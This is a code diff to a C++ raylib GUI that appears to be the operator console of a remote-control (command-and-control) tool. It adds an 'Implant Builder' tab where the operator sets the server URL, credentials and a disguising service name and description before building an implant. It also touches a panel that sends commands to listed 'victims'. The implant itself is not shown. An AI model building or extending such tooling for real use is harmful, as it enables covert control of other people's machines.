@@ -1,6 +1,8 @@
 #include "UI.hpp"
+#include "Builder.hpp"
 #include "Client.hpp"
 #include "LogManager.hpp"
+#include "FileBrowser.hpp"
 
 #include <raylib.h>
 #include <string>
@@ -30,6 +32,7 @@ int main() {
         .user_settings={},
         .implant_settings={},
         .client=Client::instance(),
+        .builder=Builder::instance(),
         .wait_for_response=false,
         .login_failed=false
     };
@@ -38,9 +41,17 @@ int main() {
     strncpy(state.user_settings.username.text, state.client.getUsername().c_str(), sizeof(state.user_settings.username.text));
     strncpy(state.user_settings.password.text, state.client.getPassword().c_str(), sizeof(state.user_settings.password.text));
     strncpy(state.user_settings.server_url.text, state.client.getServerUrl().c_str(), sizeof(state.user_settings.server_url.text));
+    strncpy(state.user_settings.default_timeout.text, state.client.getTimeout().c_str(), sizeof(state.user_settings.default_timeout.text));
     strncpy(state.user_settings.output_file_path.text, state.client.getOutputPath().c_str(), sizeof(state.user_settings.output_file_path.text));
 
     // load builder settings:
+    strncpy(state.implant_settings.username.text, state.builder.getUsername().c_str(), sizeof(state.implant_settings.username.text));
+    strncpy(state.implant_settings.password.text, state.builder.getPassword().c_str(), sizeof(state.implant_settings.password.text));
+    strncpy(state.implant_settings.server_url.text, state.builder.getServerURL().c_str(), sizeof(state.implant_settings.server_url.text));
+    strncpy(state.implant_settings.default_timeout.text, state.builder.getTimeout().c_str(), sizeof(state.implant_settings.default_timeout.text));
+    strncpy(state.implant_settings.output_file_path.text, state.client.getOutputPath().c_str(), sizeof(state.implant_settings.output_file_path.text));
+    strncpy(state.implant_settings.service_name.text, state.builder.getServiceName().c_str(), sizeof(state.implant_settings.service_name.text));
+    strncpy(state.implant_settings.service_description.text, state.builder.getServiceDesc().c_str(), sizeof(state.implant_settings.service_description.text));
 
 
     Resolution old_res = state.res;
@@ -296,11 +307,11 @@ void drawConnectionsTab(WindowState& state) {
         Rectangle btn7{menuRect.x + 10, menuRect.y + btn_height*7, 280, 25};
         Rectangle btn8{menuRect.x + 10, menuRect.y + btn_height*8, 280, 25};
 
-        const auto timeout = std::atol(state.implant_settings.default_timeout.text);
+        const auto timeout = std::atol(state.user_settings.default_timeout.text);
         const auto port = 4444;
         const auto victim = victims[selectedRow];
 
-        if (GuiButton(btn1, TextFormat("Timeout Client %d for %d min", victim.id, timeout))) {
+        if (GuiButton(btn1, TextFormat("Timeout Client %d for %d min", victim.id, static_cast<int>(timeout)))) {
             if(state.client.sendTimeoutCommand(victim.uid, timeout)) {
                 logMan.attack_log(std::format("Timeout Command Send to Client: {}", victim.uid));
             } else {
@@ -552,6 +563,8 @@ void drawLogsTab(WindowState& state) {
 //
 //-------------------------------------------------
 void drawSettingsTab(WindowState& state) {
+    static FileBrowser fb{ FileBrowser::Mode::SELECT_DIRECTORY };
+
     auto& settings = state.user_settings;
 
     const auto& res = state.res;
@@ -607,10 +620,7 @@ void drawSettingsTab(WindowState& state) {
 
     // Browse button
     if (GuiButton(Rectangle{ inputX + inputWidth - 100, startY + spacing*4, 100, inputHeight },"Browse...")) {
-        // In a real application, you would open a file dialog here
-        // For demonstration, we'll just show it was clicked
-        printf("Browse button clicked!\n");
-        // You could use a library like tinyfiledialogs for actual file selection
+        fb.open();
     }
 
     // Save button
@@ -620,18 +630,111 @@ void drawSettingsTab(WindowState& state) {
         state.client.setPassword(settings.password.text);
         state.client.setServerUrl(settings.server_url.text);
     }
+
+    fb.render();
+
+    if (not fb.is_open() && not fb.get_selected_path().empty()) {
+        strcpy(settings.output_file_path.text, fb.get_selected_path().c_str());
+        fb.clear();
+    }
 }
 
 //-------------------------------------------------
 //
 //-------------------------------------------------
 void drawBuilderTab(WindowState& state) {
+    static FileBrowser fb{ FileBrowser::Mode::SELECT_DIRECTORY };
+
+    auto& settings = state.implant_settings;
     const auto& res = state.res;
 
     GuiLabel({res.width/2 - 100, 50, 200, 30}, "Implant Builder");
 
-    Rectangle viewRect{0, 80, res.width, res.height - 90};
-    GuiPanel(viewRect, "");
+    Rectangle tabRect{0, 80, res.width, res.height - 90};
+    GuiPanel(tabRect, "");
+
+    float labelX = tabRect.x + 10;
+    float labelWidth = 100;
+    float inputX = tabRect.x + labelWidth + 5;
+    float labelHeight = 20;
+    float inputWidth = tabRect.width - inputX - 10;
+    float inputHeight = 20;
+    float startY = tabRect.y + 50;
+    float spacing = labelHeight + 10;
+
+    // Username field
+    GuiLabel({labelX, startY + 5, labelWidth, labelHeight }, "Username:");
+    if (GuiTextBox(Rectangle{ inputX, startY, inputWidth, inputHeight },
+                    settings.username.text, MAX_INPUT_CHARS, settings.username.edit)) {
+        settings.username.edit = !settings.username.edit;
+    }
+
+    // Password field
+    GuiLabel({labelX, startY + 5 + spacing, labelWidth, labelHeight }, "Password:");
+    if (GuiTextBox(Rectangle{ inputX, startY + spacing, inputWidth, inputHeight },
+                    settings.password.text, MAX_INPUT_CHARS, settings.password.edit)) {
+        settings.password.edit = !settings.password.edit;
+    }
+
+    // Timeout field
+    GuiLabel({labelX, startY + 5 + spacing*2, labelWidth, labelHeight }, "Timeout:");
+    if (GuiTextBox(Rectangle{ inputX, startY + spacing*2, inputWidth, inputHeight },
+                    settings.default_timeout.text, MAX_INPUT_CHARS, settings.default_timeout.edit)) {
+        settings.default_timeout.edit = !settings.default_timeout.edit;
+    }
+
+    // Server URL field
+    GuiLabel({labelX, startY + 5 + spacing*3, labelWidth, labelHeight }, "Server:");
+    if (GuiTextBox(Rectangle{ inputX, startY + spacing*3, inputWidth, inputHeight },
+                    settings.server_url.text, MAX_INPUT_CHARS, settings.server_url.edit)) {
+        settings.server_url.edit = !settings.server_url.edit;
+    }
+
+    // File path field with browse button
+    GuiLabel({ labelX, startY + spacing*4 + 5, labelWidth, labelHeight }, "Output File:");
+    if (GuiTextBox(Rectangle{ inputX, startY + spacing*4, inputWidth - 110, inputHeight },
+                    settings.output_file_path.text, MAX_INPUT_CHARS, settings.output_file_path.edit)) {
+        settings.output_file_path.edit = !settings.output_file_path.edit;
+    }
+
+    // Browse button
+    if (GuiButton(Rectangle{ inputX + inputWidth - 100, startY + spacing*4, 100, inputHeight },"Browse...")) {
+        fb.open();
+    }
+
+    // Service Name
+    GuiLabel({labelX, startY + 5 + spacing*5, labelWidth, labelHeight }, "Service:");
+    if (GuiTextBox(Rectangle{ inputX, startY + spacing*5, inputWidth, inputHeight },
+                    settings.service_name.text, MAX_INPUT_CHARS, settings.service_name.edit)) {
+        settings.service_name.edit = !settings.service_name.edit;
+    }
+
+    // Service Description
+    GuiLabel({labelX, startY + 5 + spacing*6, labelWidth, labelHeight }, "Description:");
+    if (GuiTextBox(Rectangle{ inputX, startY + spacing*6, inputWidth, inputHeight },
+                    settings.service_description.text, MAX_INPUT_CHARS, settings.service_description.edit)) {
+        settings.service_description.edit = !settings.service_description.edit;
+    }
+
+    // Build button
+    Rectangle saveButtonRect = { inputX, startY + spacing*7, 200, 30 };
+    if (GuiButton(saveButtonRect, "Build Implant")) {
+        state.builder.setUsername(settings.username.text);
+        state.builder.setPassword(settings.password.text);
+        state.builder.setServerURL(settings.server_url.text);
+        state.builder.setTimeout(settings.default_timeout.text);
+        state.builder.setServiceName(settings.service_name.text);
+        state.builder.setServiceDesc(settings.service_description.text);
+
+        state.builder.buildImplant(settings.output_file_path.text);
+    }
+
+    fb.render();
+
+    if (not fb.is_open() && not fb.get_selected_path().empty()) {
+        strcpy(settings.output_file_path.text, fb.get_selected_path().c_str());
+        fb.clear();
+    }
 }
 
 //-------------------------------------------------
